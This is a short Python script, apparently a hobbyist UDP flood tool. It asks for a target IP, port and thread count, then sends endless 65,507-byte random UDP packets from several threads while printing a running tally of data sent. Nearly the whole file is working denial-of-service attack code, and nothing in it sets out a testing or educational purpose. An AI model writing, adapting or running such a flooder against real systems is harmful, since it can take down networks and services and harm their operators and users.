import socket
import pystyle
from colorama import Fore
from pystyle import Write, Colors
import ipaddress
import random
import time
import threading
import sys

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(65507)
bytes_sent = 0  
lock = threading.Lock()  

def attack(ip_str, port):
    global sock, bytes, bytes_sent, lock
    try:
        while True:
            sock.sendto(bytes, (ip_str, port))
            with lock:
                bytes_sent += len(bytes)
            mb_sent = bytes_sent / (1024 * 1024)  
            gb_sent = mb_sent / 1024  
            

            sys.stdout.write(f"\r{Fore.GREEN}[+] Data sent: {mb_sent:.2f} MB ({gb_sent:.5f} GB)")
            sys.stdout.flush()
    except KeyboardInterrupt:
        print("\n[-] Error sending packet, KeyboardInterrupt")
        time.sleep(5)
        exit()

def main():
    Write.Print("""        
            ___          
            /   \\        
       /\\ | . . \\       
     ////\\|     ||       
   ////   \\ ___//\       
  ///      \\      \      
 ///       |\\      |     
//         | \\  \   \    
/          |  \\  \   \   
           |   \\ /   /   
           |    \/   /    
           |     \\/|     
           |      \\|     
           |       \\     
           |        |     
           |_________\ """, Colors.black_to_white, interval=0.001)
    
    ip_str = input(f"{Fore.RED}\nIP>> ")
    port_str = input(f"{Fore.RED}Port>> ")
    
    try:
        ipaddress.ip_address(ip_str)
        port = int(port_str)
        
        num_threads = int(input("Number of threads: "))
    
        
        threads = []
        for _ in range(num_threads):
            thread = threading.Thread(target=attack, args=(ip_str, port))
            thread.start()
            threads.append(thread)
        
        for thread in threads:
            thread.join()
    
    except ValueError:
        print("[-] Invalid IP or port")

if __name__ == "__main__":
    main()
